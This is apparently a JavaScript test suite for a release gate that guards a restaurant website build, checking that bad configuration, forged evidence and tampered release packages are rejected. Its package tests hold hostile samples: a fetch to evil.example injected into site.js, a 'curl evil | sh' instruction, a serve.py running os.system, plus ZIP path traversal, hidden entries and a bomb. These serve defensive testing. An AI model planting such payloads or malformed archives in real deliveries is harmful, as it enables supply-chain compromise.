  { g: 'configuration', t: 'a pre-release version (1.0.0-rc.1)', apply: (sb) => sb.committed(() => sb.setVersion('1.0.0-rc.1', 'client-production')), mustFail: ['stableVersion'], detail: /pre-release/ },
  { g: 'configuration', t: 'VERSION.json and package.json disagree', apply: (sb) => sb.committed(() => sb.json('package.json', (o) => { o.version = '1.0.1'; })), mustFail: ['versionConsistent'] },
  { g: 'configuration', t: 'a client configuration labelled as a demonstration', rg: 'RG-13', apply: (sb) => sb.committed(() => sb.setVersion('1.0.0', 'demonstration')), mustFail: ['versionConsistent', 'labelMatchesConfiguration'] },
  { g: 'configuration', t: 'the demonstration flag left on in an indexable build (the build itself refuses)', apply: (sb) => sb.committedUnbound(() => sb.json('config/client.json', (o) => { o.flags.demo = true; })), error: /must stay noindex|candidate build failed/, covers: ['noDemoText'] },
  { g: 'configuration', t: 'indexing switched off but structured data left on (the build itself refuses)', apply: (sb) => sb.committedUnbound(() => sb.json('config/client.json', (o) => { o.seo.noindex = true; })), error: /structuredData|candidate build failed/ },
  { g: 'configuration', t: 'indexing switched off (noindex true, no structured data)', rg: 'RG-13', apply: client((o) => { o.seo.noindex = true; o.seo.structuredData = false; }), mustFail: ['productionSeoComplete', 'searchReadiness'] },
  { g: 'configuration', t: 'structured data switched off', apply: client((o) => { o.seo.structuredData = false; }), mustFail: ['productionSeoComplete'], mayFail: ['searchReadiness'] },
  { g: 'configuration', t: 'the demonstration copy (sample address, phone, "fictional" wording) put back into an indexable build (the build itself refuses)', apply: (sb) => sb.committedUnbound(() => writeFileSync(join(sb.proj, 'config/copy.json'), sb.git('show', `${sb.parent}:jade-and-ember/config/copy.json`).stdout)), error: /demonstration|sample|candidate build failed/i },
  { g: 'configuration', t: 'no hosting target declared (seo.host)', apply: client((o) => { delete o.seo.host; }), mustFail: ['searchReadiness'], detail: /seo\.host/ },
  { g: 'configuration', t: 'a crawler policy never decided (seo.crawlers)', apply: client((o) => { delete o.seo.crawlers; }), mustFail: ['searchReadiness'], detail: /crawlers/ },
  { g: 'configuration', t: 'a crawler policy missing the AI-search decision', apply: client((o) => { delete o.seo.crawlers.aiSearch; }), mustFail: ['searchReadiness'] },
  { g: 'configuration', t: 'crawler identities no person has re-read (confirmedByPerson false)', apply: (sb) => sb.committed(() => sb.json('engineering/search-crawler-verification.json', (o) => { o.confirmedByPerson = false; })), mustFail: ['searchReadiness'], detail: /re-read/ },
  { g: 'configuration', t: 'a crawler review older than its age limit', apply: (sb) => sb.committed(() => sb.json('engineering/search-crawler-verification.json', (o) => { o.verifiedOn = '2025-01-01'; for (const a of o.agents || []) a.verifiedOn = '2025-01-01'; })), mustFail: ['searchReadiness'], detail: /days old/ },
  { g: 'configuration', t: 'the crawler verification record deleted', apply: (sb) => sb.committedUnbound(() => rmSync(join(sb.proj, 'engineering/search-crawler-verification.json'))), error: /search-crawler-verification|ENOENT/ },
  { g: 'configuration', t: 'a configuration that does not build', apply: (sb) => sb.committedUnbound(() => sb.json('config/site.json', (o) => { delete o.pages; })), error: /candidate build failed|pages/ },
  // ---- evidence: each record removed on its own, then each way of getting one wrong (the binding is the candidate artifact)
  ...[['iphone-safari', 'real-device'], ['android-chrome', 'real-device'], ['sr-nvda-firefox', 'screen-reader'], ['sr-voiceover-macos-safari', 'screen-reader'], ['sr-talkback-android-chrome', 'screen-reader'], ['desktop-chrome', 'browser-matrix'], ['desktop-firefox', 'browser-matrix'], ['desktop-safari', 'browser-matrix'], ['ci-run', 'ci-run']]
    .map(([id, type]) => ({ g: 'evidence', t: `no ${id} record`, apply: ev((sb) => sb.dropRecord(id)), mustFail: [`evidence:${type}`] })),
  { g: 'evidence', t: 'emulation offered as a physical device (E1 claimed as E3)', apply: ev((sb) => sb.editRecord('iphone-safari', (r) => { r.environment.device.emulated = true; })), mustFail: ['evidence:real-device'] },
  { g: 'evidence', t: 'a desktop record offered as a physical device (E2 claimed as E3)', apply: ev((sb) => sb.editRecord('iphone-safari', (r) => { r.class = 'E2'; })), mustFail: ['evidence:real-device'] },
  { g: 'evidence', t: 'a physical-device record for another candidate artifact', rg: 'RG-01', apply: ev((sb) => sb.editRecord('android-chrome', (r) => { r.build.candidate = OTHER; })), mustFail: ['evidence:real-device'] },
  { g: 'evidence', t: 'a physical-device record for different delivered files (assets tree differs)', apply: ev((sb) => sb.editRecord('android-chrome', (r) => { r.build.assetsTree = 'e'.repeat(64); })), mustFail: ['evidence:real-device'] },
  { g: 'evidence', t: 'a record with no candidate digest', apply: ev((sb) => sb.editRecord('desktop-safari', (r) => { delete r.build.candidate; })), mustFail: ['evidence:browser-matrix'] },
  { g: 'evidence', t: 'a record for a commit that does not exist', apply: ev((sb) => sb.editRecord('iphone-safari', (r) => { r.build.commit = 'd'.repeat(40); })), mustFail: ['evidence:real-device'] },
  { g: 'evidence', t: 'an unfilled template', apply: ev((sb) => sb.editRecord('desktop-chrome', (r) => { r.status = 'template'; })), mustFail: ['evidence:browser-matrix'] },
  { g: 'evidence', t: 'an incomplete record (a result left empty)', apply: ev((sb) => sb.editRecord('sr-nvda-firefox', (r) => { r.results.pages['visit-us.html']['sr-headings'].outcome = null; })), mustFail: ['evidence:screen-reader'] },
  { g: 'evidence', t: 'a record signed by no one', apply: ev((sb) => sb.editRecord('sr-voiceover-macos-safari', (r) => { r.attestation.signedBy = ''; })), mustFail: ['evidence:screen-reader'] },
  { g: 'evidence', t: 'a tester that is a tool (Playwright Bot)', apply: ev((sb) => sb.editRecord('desktop-firefox', (r) => { r.tester.name = 'Playwright Bot'; })), mustFail: ['evidence:browser-matrix'] },
  { g: 'evidence', t: 'a record dated in the future', apply: ev((sb) => sb.editRecord('desktop-safari', (r) => { r.date = '2099-01-01'; r.attestation.date = '2099-01-01'; })), mustFail: ['evidence:browser-matrix'] },
  { g: 'evidence', t: 'a real-device record whose test failed', apply: ev((sb) => sb.editRecord('iphone-safari', (r) => { r.results.pages['index.html'].loads.outcome = 'fail'; r.conclusion = 'failure'; r.findings.push({ id: 'DEV-1', page: 'index.html', severity: 'Minor', description: 'the page did not load', status: 'open' }); })), mustFail: ['evidence:real-device'] },
  { g: 'evidence', t: 'an attachment that is not on disk', apply: ev((sb) => rmSync(join(sb.proj, evKey(sb, 'iphone-safari')))), mustFail: ['evidence:real-device'] },
  { g: 'evidence', t: 'an attachment whose bytes changed after it was hashed', apply: ev((sb) => writeFileSync(join(sb.proj, evKey(sb, 'android-chrome')), 'replaced')), mustFail: ['evidence:real-device'] },
  { g: 'evidence', t: 'one attachment reused by two records', apply: ev((sb) => sb.editRecord('android-chrome', (r) => { r.attachments[0] = { ...sb.records.get('iphone-safari').record.attachments[0] }; })), mustFail: ['evidence:real-device'] },
  { g: 'evidence', t: 'a record file that is not valid JSON', apply: ev((sb) => writeFileSync(join(sb.evDir(), sb.records.get('desktop-chrome').file), '{ nope')), mustFail: ['evidence:real-device', 'evidence:screen-reader', 'evidence:browser-matrix', 'evidence:ci-run'] },
  // ---- CI evidence: a summary of the verification record of the run, bound to the candidate (RG-08, RB-13)
  { g: 'ci-evidence', t: 'a CI record for another candidate artifact', rg: 'RG-08', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.build.candidate = OTHER; r.verification.candidate = OTHER; })), mustFail: ['evidence:ci-run'] },
  { g: 'ci-evidence', t: 'a CI record whose summary names another candidate than its build', rg: 'RG-08', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.verification.candidate = OTHER; })), mustFail: ['evidence:ci-run'] },
  { g: 'ci-evidence', t: 'a CI record made by other verification code', rg: 'RG-08', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.verification.engineDigest = 'f'.repeat(64); })), mustFail: ['evidence:ci-run'] },
  { g: 'ci-evidence', t: 'a CI record that reports fewer checks than the verifier defines', rg: 'RG-08', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.verification.checks = { total: 12, passed: 12 }; })), mustFail: ['evidence:ci-run'] },
  { g: 'ci-evidence', t: 'a CI record reporting a failing check', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.verification.checks.passed = r.verification.checks.total - 1; })), mustFail: ['evidence:ci-run'] },
  { g: 'ci-evidence', t: 'a CI record from a run on a person\'s machine', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.verification.runner = 'local'; })), mustFail: ['evidence:ci-run'] },
  { g: 'ci-evidence', t: 'a CI record whose run id is not the URL\'s run', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.verification.runId = '999999'; })), mustFail: ['evidence:ci-run'] },
  { g: 'ci-evidence', t: 'a CI record with no verification summary at all', rg: 'RG-08', apply: ev((sb) => sb.editRecord('ci-run', (r) => { delete r.verification; })), mustFail: ['evidence:ci-run'] },
  { g: 'ci-evidence', t: 'a CI record whose run did not succeed', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.conclusion = 'failure'; })), mustFail: ['evidence:ci-run'] },
  { g: 'ci-evidence', t: 'a CI record with no GitHub run URL', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.url = 'https://example.test/run/1'; })), mustFail: ['evidence:ci-run'] },
  { g: 'ci-evidence', t: 'a CI record on an earlier commit (the parent) with the same candidate: bound to the artifact, so it still counts', allow: true, rg: 'RG-01', apply: ev((sb) => sb.editRecord('ci-run', (r) => { r.build.commit = sb.parent; })) },
];

// ---- environment restrictions -------------------------------------------------------------------------------------------------------------
export function runEnvironmentScenarios(sb) {
  const rows = [], add = (t, ok, detail) => rows.push({ g: 'environment', t, ok, detail });
  sb.restore();
  for (const cmd of ['gate', 'prepare', 'manifest']) {
    const r = sb.tool([cmd, '--channel', 'demonstration']);
    add(`${cmd} --channel demonstration on a client-production configuration is refused`, r.status === 1 && /REFUSED: this build is a client-production build/.test(r.out) && !existsSync(join(sb.proj, 'release')), `exit ${r.status}: ${r.out.split('\n')[0]}`);
  }
  let r = sb.tool(['bogus']);
  add('an unknown command exits 2 and does nothing', r.status === 2 && !existsSync(join(sb.proj, 'release')), `exit ${r.status}`);
  // deployment authorisation is information only, a separate record family
  sb.recordsChange(() => sb.put(sb.record('deployment-authorisation')));
  let g = sb.gate(['--channel', 'client-production']);
  add('a deployment authorisation for the candidate, the release approval and the host is reported, and the tool still only prints', g.allowed && g.deployment === 'true' && /nothing here deploys/.test(g.out), `allowed ${g.allowed}, deployment approved ${g.deployment}`);
  const aud = sb.audit('deployments');
  add('the deployment family is audited on its own', aud.status === 0 && /deployments: 1 record file/.test(aud.out) && /DEP-JE-901/.test(aud.out), aud.out.split('\n').find((l) => /DEP-JE-901/.test(l))?.trim() || aud.out.slice(-160));
  sb.restore();
  sb.recordsChange(() => { sb.drop(F.rel); sb.put(sb.record('deployment-authorisation')); });
  g = sb.gate(['--channel', 'client-production']);
  add('a deployment authorisation does not unblock a build that is missing its release approval', !g.allowed && g.failing.join() === REL.join() && g.deployment === 'false', `failing ${g.failing.join(', ')}; deployment approved ${g.deployment}`);
  sb.restore();
  sb.recordsChange(() => sb.put(sb.record('deployment-authorisation', { subject: { releaseApproval: 'REL-JE-777' } })));
  g = sb.gate(['--channel', 'client-production']);
  add('a deployment authorisation that relies on another release approval is not reported as authorised', g.allowed && g.deployment === 'false', `allowed ${g.allowed}; deployment approved ${g.deployment}`);
  sb.restore();
  sb.recordsChange(() => sb.put(sb.record('deployment-authorisation', { subject: { targetHost: 'www.some-other-host.com' } })));
  g = sb.gate(['--channel', 'client-production']);
  add('a deployment authorisation for another host is not reported as authorised', g.allowed && g.deployment === 'false', `allowed ${g.allowed}; deployment approved ${g.deployment}`);
  sb.restore();
  sb.recordsChange(() => { sb.put(sb.record('deployment-authorisation')); sb.put(sb.record('deployment-authorisation', { id: 'DEP-JE-902', status: 'revoked', ends: 'DEP-JE-901', decidedAt: `${TODAY()}T12:00:00Z` })); });
  g = sb.gate(['--channel', 'client-production']);
  add('a revoked deployment authorisation is not reported as authorised', g.allowed && g.deployment === 'false', `allowed ${g.allowed}; deployment approved ${g.deployment}`);
  sb.restore();
  // each family is audited on its own and says what is in force
  const a1 = sb.audit('approvals');
  add('the approvals are audited on their own: three records in force, nothing about evidence', a1.status === 0 && /release-approval: SATISFIED/.test(a1.out) && /in force \(R-91/.test(a1.out) && !/== evidence/.test(a1.out), a1.out.split('\n').find((l) => /release-approval:/.test(l))?.trim() || a1.out.slice(-160));
  const a2 = sb.audit('evidence');
  add('the evidence is audited on its own: 9 records, all four requirements satisfied', a2.status === 0 && /== evidence: 9 record file/.test(a2.out) && ['real-device', 'screen-reader', 'browser-matrix', 'ci-run'].every((t) => new RegExp(`${t}: SATISFIED`).test(a2.out)) && !/== approvals/.test(a2.out), a2.out.split('\n').filter((l) => /SATISFIED/.test(l)).length + ' requirements satisfied');
  const a3 = sb.audit('verification');
  add('the verification record is audited on its own and valid for this build', a3.status === 0 && /valid for this build/.test(a3.out), a3.out.split('\n').find((l) => /== verification/.test(l))?.trim() || a3.out.slice(-160));
  // prepare while blocked writes nothing
  sb.recordsChange(() => sb.dropRecord('iphone-safari'));
  r = sb.tool(['prepare']);
  add('prepare on a blocked build exits 1, says NOT PREPARED and writes no release folder', r.status === 1 && /NOT PREPARED/.test(r.out) && !existsSync(join(sb.proj, 'release')), `exit ${r.status}; release folder exists: ${existsSync(join(sb.proj, 'release'))}`);
  sb.restore();
  return rows;
}

// RG-01: recording the approvals and the CI result in the repository, as the process describes, no longer invalidates them.
export function runLedgerScenario(sb) {
  sb.restore();
  const before = sb.measure();
  const headBefore = sb.head;
  // the documented flow, once more and explicitly: new records are committed on top of the verified commit
  sb.recordsChange(() => { sb.put(sb.record('deployment-authorisation')); sb.put(sb.record('release-approval', { id: 'REL-JE-950', decidedBy: { reviewer: 'R-91', name: PERSONA.owner.name }, decidedAt: `${TODAY()}T12:00:00Z` })); }, 'synthetic dry run: record a further approval');
  const after = sb.measure();
  const g = sb.gate(['--channel', 'client-production']);
  const rows = [
    { g: 'ledger', rg: 'RG-01', t: 'the approvals, the evidence and the CI summary are committed to the repository (the documented flow): HEAD moves, the candidate digest does not, and the gate passes', ok: g.allowed && before.candidate.digest === after.candidate.digest && headBefore !== sb.head, expected: 'ALLOWED; HEAD changed; candidate digest unchanged', observed: `${g.allowed ? 'ALLOWED' : `BLOCKED by ${g.failing.join(', ')}`}; HEAD ${headBefore.slice(0, 7)} -> ${sb.head.slice(0, 7)}; candidate ${before.candidate.digest.slice(0, 12)}… -> ${after.candidate.digest.slice(0, 12)}…` },
    { g: 'ledger', rg: 'RG-01', t: 'every record names the candidate digest and no record names HEAD', ok: (() => { const recs = [...readdirSync(sb.dir('approvals'))].filter((f) => f.endsWith('.json')).map((f) => JSON.parse(readFileSync(join(sb.dir('approvals'), f), 'utf8'))); return recs.length >= 4 && recs.every((r) => r.candidate === after.candidate.digest && !JSON.stringify(r).includes(sb.head)); })(), expected: 'bound to the artifact, not to a commit', observed: 'checked' },
  ];
  sb.restore();
  return rows;
}

// ---- the prepared package: integrity, reproducibility, tampering ----------------------------------------------------------------------------
const copyDir = (from) => { const to = tempDir('pkgcopy'); cpSync(from, to, { recursive: true }); return to; };
export function runPackageScenarios(sb) {
  const rows = [], add = (t, ok, detail, extra = {}) => rows.push({ g: 'package', t, ok, detail, ...extra });
  sb.restore();
  const r1 = sb.tool(['prepare']);
  const rel = join(sb.proj, 'release');
  if (r1.status !== 0) { add('prepare on the fully green synthetic build', false, `exit ${r1.status}: ${r1.out.slice(-200)}`); return rows; }
  const v = verifyPackage(rel, { eng: join(sb.proj, 'engineering') });
  add('prepare on the fully green synthetic build writes a package that verifies', v.ok, v.checks.map((c) => `${c.ok ? 'ok' : 'FAIL'} ${c.id}`).join(', '));
  const snap = (d) => listFiles(d).map((f) => `${sha(readFileSync(join(d, f)))}  ${f}`).join('\n');
  const first = snap(rel);
  rmSync(rel, { recursive: true, force: true });
  const r2 = sb.tool(['prepare']);
  add('preparing the same commit twice gives byte-identical files (reproducible)', r2.status === 0 && snap(rel) === first, `${listFiles(rel).length} files compared`);
  const good = copyDir(rel);
  const run = (t, fn, mustFail, extra = {}) => {
    const d = copyDir(good);
    try { fn(d); const res = verifyPackage(d, { eng: join(sb.proj, 'engineering') }); const failing = res.checks.filter((c) => !c.ok).map((c) => c.id); add(t, mustFail.every((m) => failing.includes(m)) && !res.ok, `failing: ${failing.join(', ') || 'none'}${failing.length ? ` — ${res.checks.find((c) => !c.ok).detail.slice(0, 110)}` : ''}`, extra); } finally { rmSync(d, { recursive: true, force: true }); }
  };
  const zipName = () => listFiles(good).find((f) => f.endsWith('.zip'));
  const rd = (d, n) => readFileSync(join(d, n)), wr = (d, n, b) => { mkdirSync(join(d, n, '..'), { recursive: true }); writeFileSync(join(d, n), b); };
  const sums = (d) => { const z = listFiles(d).find((f) => f.endsWith('.zip')); wr(d, 'SHA256SUMS.txt', ['release-manifest.json', z].map((n) => `${sha(rd(d, n))}  ${n}`).join('\n') + '\n'); };
  const manifest = (d, fn) => { const m = JSON.parse(rd(d, 'release-manifest.json')); fn(m); wr(d, 'release-manifest.json', JSON.stringify(m, null, 2) + '\n'); sums(d); };
  const rec = (d, fam, name, fn) => { const p = `records/${fam}/${name}`; const r = JSON.parse(rd(d, p)); fn(r); wr(d, p, JSON.stringify(r, null, 2) + '\n'); };
  // the records travel in the package, listed by hash in the manifest; "consistent" tampering updates both
  const rehash = (d, fam) => manifest(d, (m) => { m.records[fam] = listFiles(join(d, 'records', fam)).filter((f) => f.endsWith('.json')).map((f) => ({ file: f, sha256: sha(rd(d, `records/${fam}/${f}`)) })); });
  run('one byte of the ZIP flipped', (d) => { const b = Buffer.from(rd(d, zipName())); b[Math.floor(b.length / 2)] ^= 1; wr(d, zipName(), b); }, ['checksums', 'package-binding']);
  run('the manifest edited (version changed)', (d) => wr(d, 'release-manifest.json', rd(d, 'release-manifest.json').toString().replace('"version": "1.0.0"', '"version": "1.0.1"')), ['checksums']);
  run('a line deleted from SHA256SUMS.txt', (d) => wr(d, 'SHA256SUMS.txt', rd(d, 'SHA256SUMS.txt').toString().split('\n')[0] + '\n'), ['checksums']);
  run('SHA256SUMS.txt lists an extra file', (d) => wr(d, 'SHA256SUMS.txt', rd(d, 'SHA256SUMS.txt') + `${'a'.repeat(64)}  extra.bin\n`), ['checksums']);
  run('host/_headers weakened (the CSP removed) — not covered by SHA256SUMS', (d) => wr(d, 'host/_headers', rd(d, 'host/_headers').toString().replace(/Content-Security-Policy: .*\n/, '')), ['security']);
  run('host/nginx.conf edited', (d) => wr(d, 'host/nginx.conf', rd(d, 'host/nginx.conf') + '\n# edited\n'), ['security']);
  run('a host file missing', (d) => rmSync(join(d, 'host/htaccess')), ['files']);
  run('the records folder missing (reviewer table)', (d) => rmSync(join(d, 'records/reviewers.json')), ['files']);
  run('the ZIP replaced by another valid ZIP, checksums updated, manifest not', (d) => { wr(d, zipName(), zipBuffer([{ name: 'index.html', data: Buffer.from('<p>other</p>') }])); sums(d); }, ['package-binding']);
  run('the manifest says the gate BLOCKED this build', (d) => manifest(d, (m) => { m.gate.allowed = false; m.gate.requirements[0].ok = false; }), ['gate-recorded']);
  run('the manifest records a dirty source tree', (d) => manifest(d, (m) => { m.source.dirty = true; }), ['gate-recorded']);
  const rezip = (d, edit) => {
    const site = tempDir('forge');
    try {
      const names = unzipTo(rd(d, zipName()), site);
      edit(site, names);
      const z2 = zipBuffer(listFiles(site).map((name) => ({ name, data: readFileSync(join(site, name)) })));
      wr(d, zipName(), z2);
      return { site, z2 };
    } catch (e) { rmSync(site, { recursive: true, force: true }); throw e; }
  };
  const rewire = (d, site, z2) => { const am = buildManifest(site); rmSync(site, { recursive: true, force: true }); manifest(d, (m) => { Object.assign(m.package, { bytes: z2.length, sha256: sha(z2) }); Object.assign(m.assets, { treeSha256: am.treeSha256, fileCount: am.fileCount, totalBytes: am.totalBytes }); }); };
  run('a script added to the ZIP; manifest package hash, asset tree and checksums updated: the ZIP is no longer the approved artifact', (d) => { const { site, z2 } = rezip(d, (s) => writeFileSync(join(s, 'site.js'), `${readFileSync(join(s, 'site.js'), 'utf8')}\nfetch('https://evil.example/');`)); rewire(d, site, z2); }, ['candidate-digest'], { rg: 'RG-14' });
  run('a script added to the ZIP; manifest package hash and checksums updated (asset tree not)', (d) => { const { site, z2 } = rezip(d, (s) => writeFileSync(join(s, 'site.js'), `${readFileSync(join(s, 'site.js'), 'utf8')}\nfetch('https://evil.example/');`)); rmSync(site, { recursive: true, force: true }); manifest(d, (m) => { Object.assign(m.package, { bytes: z2.length, sha256: sha(z2) }); }); }, ['asset-tree']);
  run('a file that does not belong in a delivered site (config/client.json) added', (d) => { const { site, z2 } = rezip(d, (s) => { mkdirSync(join(s, 'config'), { recursive: true }); writeFileSync(join(s, 'config/client.json'), '{}'); }); rmSync(site, { recursive: true, force: true }); manifest(d, (m) => { Object.assign(m.package, { bytes: z2.length, sha256: sha(z2) }); }); }, ['zip-contents']);
  run('a ZIP entry that escapes the folder (../evil)', (d) => { wr(d, zipName(), zipBuffer([{ name: '../evil', data: Buffer.from('x') }])); manifest(d, (m) => { m.package.bytes = rd(d, zipName()).length; m.package.sha256 = sha(rd(d, zipName())); }); }, ['zip']);
  // the approved artifact must be the delivered artifact (control 6), and the records must be the ones that approved it
  run('the manifest names another candidate digest than the ZIP produces (even with a consistent manifest)', (d) => manifest(d, (m) => { m.candidate.digest = OTHER; }), ['candidate-digest'], { rg: 'RG-01' });
  run('the manifest\'s non-delivered parts edited (the policy digest), digest left', (d) => manifest(d, (m) => { m.candidate.parts.releasePolicy = OTHER; }), ['candidate-digest']);
  run('the release approval removed from the package, manifest list updated', (d) => { rmSync(join(d, 'records/approvals', F.rel)); rehash(d, 'approvals'); }, ['approvals-recorded']);
  run('the release approval in the package edited to another candidate, manifest hash updated', (d) => { rec(d, 'approvals', F.rel, (r) => { r.candidate = OTHER; }); rehash(d, 'approvals'); }, ['approvals-recorded']);
  run('the release approval in the package edited, manifest hash NOT updated', (d) => rec(d, 'approvals', F.rel, (r) => { r.rationale = 'edited'; }), ['records-embedded']);
  run('a record added to the package that the manifest does not list', (d) => wr(d, 'records/approvals/REL-JE-950.json', '{}'), ['records-embedded']);
  run('the release approval in the package REVOKED, manifest updated', (d) => { wr(d, 'records/approvals/REL-JE-902.json', JSON.stringify({ ...JSON.parse(rd(d, `records/approvals/${F.rel}`)), id: 'REL-JE-902', status: 'revoked', ends: 'REL-JE-901', decidedAt: `${TODAY()}T12:00:00Z` }, null, 2)); rehash(d, 'approvals'); }, ['approvals-recorded'], { rg: 'RG-06' });
  run('the release approval in the package REJECTED, manifest updated', (d) => { rec(d, 'approvals', F.rel, (r) => { r.status = 'rejected'; }); rehash(d, 'approvals'); }, ['approvals-recorded'], { rg: 'RG-04' });
  run('the reviewer table in the package emptied, manifest hash updated', (d) => { wr(d, 'records/reviewers.json', JSON.stringify({ schema: 'jade-and-ember/reviewers@1', establishedBy: null, reviewers: [] })); manifest(d, (m) => { m.records.reviewers.sha256 = sha(rd(d, 'records/reviewers.json')); }); }, ['approvals-recorded']);
  run('a CI evidence record removed from the package, manifest list updated', (d) => { rmSync(join(d, 'records/evidence', listFiles(join(d, 'records/evidence')).find((f) => f.startsWith('ci-run.')))); rehash(d, 'evidence'); }, ['evidence-recorded']);
  run('the verification record in the package edited (the seal breaks)', (d) => { const v = JSON.parse(rd(d, 'records/verification.json')); v.checks[0].seconds = 77; wr(d, 'records/verification.json', JSON.stringify(v, null, 2)); }, ['verification-record']);
  run('the client package carries the demonstration marker', (d) => manifest(d, (m) => { m.demonstration = { fictional: true, statement: 'FICTIONAL DEMONSTRATION: pretending to be a demonstration, which a client package must never carry.', registeredAs: null }; }), ['demonstration-marker'], { rg: 'RG-13' });
  // ---- the container and the files beside the site (review F1, F2): every one of these is a ZIP that two extractors could read differently, or a file nothing hashed
  const setZip = (d, z) => { wr(d, zipName(), z); manifest(d, (m) => { m.package.bytes = z.length; m.package.sha256 = sha(z); }); };   // package fields and checksums made consistent: only the container is wrong
  const zipOf = (d) => Buffer.from(rd(d, zipName()));
  const eocdOf = (b) => b.length - 22;
  run('serve.py replaced inside the ZIP (package hash, checksums updated): the recipient would run it', (d) => { const { site, z2 } = rezip(d, (s) => writeFileSync(join(s, 'serve.py'), 'import os\nos.system("echo pwned")\n')); rmSync(site, { recursive: true, force: true }); manifest(d, (m) => { m.package.bytes = z2.length; m.package.sha256 = sha(z2); }); }, ['package-extras']);
  run('START-HERE.txt given an extra line ("Also run: curl evil | sh")', (d) => { const { site, z2 } = rezip(d, (s) => writeFileSync(join(s, 'START-HERE.txt'), `${readFileSync(join(s, 'START-HERE.txt'), 'utf8')}Also run: curl evil | sh\n`)); rmSync(site, { recursive: true, force: true }); manifest(d, (m) => { m.package.bytes = z2.length; m.package.sha256 = sha(z2); }); }, ['package-extras']);
  run('a ZIP that lists site.js twice (an evil copy first, the approved one last)', (d) => { const { site, z2 } = rezip(d, () => {}); rmSync(site, { recursive: true, force: true }); const names = []; const tmp = tempDir('dup'); try { const got = unzipTo(z2, tmp); for (const n of got) names.push({ name: n, data: readFileSync(join(tmp, n)) }); } finally { rmSync(tmp, { recursive: true, force: true }); } setZip(d, zipBuffer([{ name: 'site.js', data: Buffer.from('/* evil */') }, ...names])); }, ['zip']);
  run('a ZIP with a comment and bytes after the end record (a streaming extractor sees more than the index)', (d) => setZip(d, Buffer.concat([zipOf(d), Buffer.from('#!/bin/sh\necho extra\n')])), ['zip']);
  run('a ZIP with an extra local entry (evil.sh) the central directory does not list', (d) => {
    const b = zipOf(d), e = eocdOf(b), cd = b.readUInt32LE(e + 16), name = Buffer.from('evil.sh'), data = Buffer.from('echo evil\n');
    const h = Buffer.alloc(30); h.writeUInt32LE(0x04034b50, 0); h.writeUInt16LE(20, 4); h.writeUInt32LE(data.length, 18); h.writeUInt32LE(data.length, 22); h.writeUInt16LE(name.length, 26);
    const eo = Buffer.from(b.subarray(e)); eo.writeUInt32LE(cd + 30 + name.length + data.length, 16);
    setZip(d, Buffer.concat([b.subarray(0, cd), h, name, data, b.subarray(cd, e), eo]));
  }, ['zip']);
  run('a ZIP whose local header names another file than the central directory (site.js here, evil.js there)', (d) => { const b = zipOf(d); const i = b.indexOf(Buffer.from('site.js')); b.write('evil.js', i); setZip(d, b); }, ['zip']);
  run('a ZIP with two names that differ only in case (Site.js beside site.js)', (d) => { const { site, z2 } = rezip(d, () => {}); rmSync(site, { recursive: true, force: true }); const tmp = tempDir('case'); try { const got = unzipTo(z2, tmp).map((n) => ({ name: n, data: readFileSync(join(tmp, n)) })); setZip(d, zipBuffer([...got, { name: 'Site.js', data: Buffer.from('/* shadow */') }])); } finally { rmSync(tmp, { recursive: true, force: true }); } }, ['zip']);
  run('a ZIP entry with a backslash in its name (a traversal on some extractors)', (d) => { const { site, z2 } = rezip(d, () => {}); rmSync(site, { recursive: true, force: true }); const tmp = tempDir('bs'); try { const got = unzipTo(z2, tmp).map((n) => ({ name: n, data: readFileSync(join(tmp, n)) })); setZip(d, zipBuffer([...got, { name: 'a\\..\\x.html', data: Buffer.from('<p>x</p>') }])); } finally { rmSync(tmp, { recursive: true, force: true }); } }, ['zip']);
  run('a ZIP entry marked executable in the file attributes', (d) => { const b = zipOf(d); const i = b.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02])); b.writeUInt32LE(0x81ed0000, i + 38); setZip(d, b); }, ['zip']);
  run('a ZIP entry that inflates to more than its declared size (a bomb)', (d) => { const b = zipOf(d); const i = b.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02])); b.writeUInt32LE(1, i + 24); setZip(d, b); }, ['zip']);
  // ---- what the verifier no longer takes from the manifest (review F4)
  run('the manifest\'s recorded gate lists no requirements and an open Blocker finding is added', (d) => manifest(d, (m) => { m.gate.requirements = []; m.findings.push({ id: 'F-DRY-9', severity: 'Blocker', visual: false, status: 'open' }); }), ['gate-recorded']);
  run('the manifest\'s recorded gate lists a subset of the policy\'s requirements, all met', (d) => manifest(d, (m) => { m.gate.requirements = m.gate.requirements.slice(0, 3); }), ['gate-recorded']);
  run('the verification record cut to one check, resealed, the manifest summary updated', (d) => { const v = JSON.parse(rd(d, 'records/verification.json')); v.checks = v.checks.slice(0, 1); v.seal = sealOf(v); wr(d, 'records/verification.json', JSON.stringify(v, null, 2)); manifest(d, (m) => { m.qa.report.seal = v.seal; m.qa.report.checks = m.qa.report.checks.slice(0, 1); }); }, ['verification-record']);
  run('the manifest names another production host than the pages (the approval then names the manifest\'s host)', (d) => manifest(d, (m) => { m.configuration.baseUrl = 'https://www.another-restaurant.example/'; }), ['production-host']);
  run('the package was judged by another reviewer table than this checkout\'s (a reviewer added, hash updated)', (d) => { const t = JSON.parse(rd(d, 'records/reviewers.json')); t.reviewers.push({ id: 'R-97', name: 'Added Persona', role: 'synthetic', mayApprove: ['release-approval'], mayReject: [], mayRevoke: [], validFrom: '2026-01-01', validTo: null }); wr(d, 'records/reviewers.json', JSON.stringify(t, null, 2)); manifest(d, (m) => { m.records.reviewers.sha256 = sha(rd(d, 'records/reviewers.json')); }); }, ['rules-match-repository']);
  run('the evidence in the package: a CI record for a run of another repository, manifest list updated', (d) => { const f = listFiles(join(d, 'records/evidence')).find((x) => x.startsWith('ci-run.')); rec(d, 'evidence', f, (r) => { r.url = 'https://github.com/someone-else/other-repo/actions/runs/123456'; }); rehash(d, 'evidence'); }, ['evidence-recorded']);
